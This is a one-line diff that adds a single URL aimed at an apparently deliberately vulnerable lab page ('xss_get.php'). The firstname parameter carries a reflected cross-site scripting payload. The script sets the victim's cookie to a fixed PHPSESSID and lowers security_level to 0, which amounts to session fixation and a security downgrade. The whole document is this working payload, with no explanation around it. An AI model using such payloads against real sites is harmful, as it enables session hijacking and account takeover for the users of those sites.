@@ -1,0 +1,1 @@
+http://vulnerable.site/xss_get.php?firstname=<script>document.cookie="PHPSESSID=bvcmc50rt479g18g8imp89ord4;+security_level=0";</script>&lastname=Victim+Any&form=submit
